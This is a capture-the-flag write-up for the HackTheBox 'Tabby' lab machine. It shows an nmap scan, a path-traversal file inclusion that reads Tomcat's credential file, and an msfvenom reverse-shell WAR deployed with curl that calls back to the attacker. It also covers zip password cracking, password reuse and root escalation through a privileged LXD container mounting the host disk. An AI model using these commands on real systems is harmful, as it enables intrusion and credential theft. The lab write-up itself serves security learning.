---
title: HackTheBox — Tabby Writeup
date: 2020-11-07 04:41:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, tabby, ctf, linux, apache, tomcat, lfi, virtual host, shell, backup, crack password, lxd, privilege escaltion, root]
image: /assets/img/Posts/tabby.jpg
---

>If you can't give me poetry, can't you give me poetical science?
>
> -Ada Lovelace.
>
>This machine is a Linux based machine. I learned a few things  about Linux. 
>
>Its difficulty level is easy and has an IP 10.10.10.194


## Reconnaissance

I started with basic `nmap` enumeration.

### Nmap:

```shell
ezi0x00@kali:~/HTB/Tabby$ sudo nmap -sV -sC -O 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 01:00 EST
Nmap scan report for 10.10.10.194
Host is up (0.31s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/7%OT=22%CT=1%CU=36183%PV=Y%DS=2%DC=I%G=Y%TM=5FA6383
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.48 seconds
```
### Summary:

1. Port 80 - HTTP Service 
2. Port 8080 - Hosted Web Server `Apache Tomcat`
3. Port 22 -- SSH Service

## Port 80 - HTTP Service 

dd it to /etc/hosts to redirect to there:

![website](/assets/img/Posts/webservice.png)

i started enumerating endpoints with burp spider and we found that the news navigation item is redirecting us to a URL `http://tabby.htb/news.php?file=statement`.
![website](/assets/img/Posts/lfierror.png)
We got `LFI` in one endpoint.

![website](/assets/img/Posts/lfi.png)

if we have `LFI`, We should reach to any credentials to preform `RCE`
let's see visit `8080` we can get any hint.

## Port 8080 - Host Web Server (Apache Tomcat)

![website](/assets/img/Posts/tomcatserver.png)

I think we get hint

>NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml. 
so let's visit `host-manager webapp`

![website](/assets/img/Posts/hostwebapp.png)

When we clicked on `host-manager webapp` link it redirect to login page asknig about username and password.
So this is what happened in the `hint`, and this is the admin page, so we must follow the path `/etc/tomcat9/tomcat-users.xml` and we may get any cred as in the hint that there is a `Users are defiend`
Here the `LFI` can be used.
`http://tabby.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml`

we get a blank page
![website](/assets/img/Posts/blankpage.png)
let's view a source code
![website](/assets/img/Posts/sourcecode.png)

we get username and password of admin.

`tomcat:$3cureP4s5w0rd123!`

Now try logging in `host-manager webapp` With the cred we got. 
![website](/assets/img/Posts/loging.png)
Apache tomact allows us to create virtual hosts with a terminal using which we could inject a war payload by creating a new virtual host.

## Shell

let's create a new virtual host and uploading the reverse shell payload file
enter the following command to create a reverse shell payload using metasploit.
```shell
ezi0x00@kali:~/HTB/Tabby$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<vpn hackthebox ip> LPORT=4444 -f war > 0xN1ghtR1ngs.war
Payload size: 1097 bytes
Final size of war file: 1097 bytes

ezi0x00@kali:~/HTB/Tabby$ ls -lah
total 12K
drwxr-xr-x  2 ezi0x00 ezi0x00 4.0K Nov  7 02:55 .
drwxr-xr-x 11 ezi0x00 ezi0x00 4.0K Nov  7 00:56 ..
-rw-r--r--  1 ezi0x00 ezi0x00 1.1K Nov  7 02:55 0xN1ghtR1ngs.war
```
Enter the following command to create a virtual host with payload you created payload.war
```shell
ezi0x00@kali:~/HTB/Tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T 0xN1ghtR1ngs.war http://10.10.10.194:8080/manager/text/deploy?path=/0xN1ghtR1ngs
OK - Deployed application at context path [/0xN1ghtR1ngs]
```
Starting nc listeners and executing the shell
![website](/assets/img/Posts/shelltabby.png)

So we get a shell, let's make it interactive with `pty` 
![website](/assets/img/Posts/interactiveshelltabby.png)
 
Change the directory to `/var/www/html` to search for backup files because we need to privilege escalation for user.
```shell
tomcat@tabby:/var/lib/tomcat9$ cd /var/www/html/
cd /var/www/html/
tomcat@tabby:/var/www/html$ ls
ls
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
tomcat@tabby:/var/www/html$ cd files
cd files
tomcat@tabby:/var/www/html/files$ ls
ls
16162020_backup.zip  archive  revoked_certs  statement
tomcat@tabby:/var/www/html/files$ 
```
let's download this backup by `nc`
![website](/assets/img/Posts/backup.png)

let's open it 
```shell
ezi0x00@kali:~/HTB/Tabby$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password:
```
When I see every step a password is required
![website](/assets/img/Posts/cursed.jpg)

let's crack it with `fcrackzip`
```shell
ezi0x00@kali:~/HTB/Tabby$ fcrackzip -D -p /home/ezi0x00/rockyou.txt 16162020_backup.zip 
possible pw found: admin@it ()
```
we get the password as `admin@it`
```shell
ezi0x00@kali:~/HTB/Tabby$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt 
 ``` 
If you searched in the files that you have decompressed, you will not find anything. 
The whole idea is that you got a password. That password will log into the user on the machine. called ash 
```shell
tomcat@tabby:/home$ ls
ls
ash
```
let's login with the `ash` username and password is `admin@it`.
```shell
tomcat@tabby:/home$ su ash
su ash
Password: admin@it

ash@tabby:/home$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) 
ash@tabby:/home$ ls
ls
ash
ash@tabby:/home$ cd ash
ash@tabby:~$ ls 
ls
user.txt
ash@tabby:~$ cat user.txt
cat user.txt
a2cecc4071791*******************
```

## Privilege Escaltion

First when Find out user and group names and numeric ID's we've seen and attract my attention `lxd`
I don't know what `lxd` is, but after researching I found this [**article**](https://www.hackingarticles.in/lxd-privilege-escalation/) that is a member of the lxd group is able to escalate the root privilege by exploiting the features of `lxd`.
>Briefly: LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.
okay let's got a `root`

First, we need this [**script**](https://github.com/saghul/lxd-alpine-builder) to create Alpine Linux images for their use with `lxd`.
```shell
ezi0x00@kali:~/HTB/Tabby$ git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Unpacking objects: 100% (27/27), 15.98 KiB | 251.00 KiB/s, done.
ezi0x00@kali:~/HTB/Tabby$ cd lxd-alpine-builder/
```
 It will create a tar.gz file as shown below
 ```shell
 ezi0x00@kali:~/HTB/Tabby/lxd-alpine-builder$ ls 
alpine-v3.12-x86_64-20201107_0534.tar.gz  build-alpine  LICENSE  README.md
```
we need to send it to tabby machine i will use `SimpleHTTPServer` in python.
![website](/assets/img/Posts/alpine.png)
and we get it 
```shell 
ash@tabby:~$ ls 
ls 
alpine-v3.12-x86_64-20201107_0534.tar.gz  user.txt
```

We have come to the end of the road
Next is the process that we did to get root 
let's start

```shell
ash@tabby:~$ ls 
ls 
alpine-v3.12-x86_64-20201107_0534.tar.gz  snap  user.txt
ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200621_2204.tar.                                         
lxc image import ./alpine-v3.12-x86_
Error: open ./alpine-v3.12-x86_: no such file or directory
ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20201107_0534.tar.gz --alias liquid
<ne-v3.12-x86_64-20201107_0534.tar.gz --alias liquid

ash@tabby:~$ lxc image list
lxc image list
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| liquid | 6fa64fa82f78 | no     | alpine v3.12 (20201107_05:34) | x86_64       | CONTAINER | 3.04MB | Nov 7, 2020 at 4:13am (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
ash@tabby:~$ lxd init
lxd init                                                                                                                                                     
Would you like to use LXD clustering? (yes/no) [default=no]: no                                                                                              
no                                                                                                                                                           
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes                                                                                     
yes                                                                                                                                                                                         
Name of the new storage pool [default=default]:                                                                                                                                             
                                                                                                                                                                                            
Name of the storage backend to use (btrfs, dir, lvm, ceph) [default=btrfs]: dir                                                                                                             
dir                                                                                                                                                                                         
Would you like to connect to a MAAS server? (yes/no) [default=no]: no                                                                                                                       
no                                                                                                                                                                                          
Would you like to create a new local network bridge? (yes/no) [default=yes]: yes                                                                                                            
yes                                                                                                                                                                                                              
What should the new bridge be called? [default=lxdbr0]: liquid                                                                                                                                                   
liquid                                                                                                                                                                                                           
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:                                                                                                                                                 
                                                                                                                                                                                                                                           
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:                                                                                                                                                 
                                                                                                                                                                                                                                           
Would you like LXD to be available over the network? (yes/no) [default=no]:                                                                                                                                                                
                                                                                                                                                                                                                                           
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]                                                                                                                                                     
                                                                                                                                                                                                                                           
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:                                                                                                                                                             

ash@tabby:~$ lxc init liquid privesc -c security.privileged=true
lxc init liquid privesc -c security.privileged=true
Creating privesc

ash@tabby:~$ lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to privesc

ash@tabby:~$ lxc start privesc
lxc start privesc

ash@tabby:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # id        
id 
uid=0(root) gid=0(root)

~ # cd /mnt/root
cd /mnt/root
/mnt/root # /mnt/root # cat root/root.txt
cat root/root.txt
49086b9c1747f*******************
```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
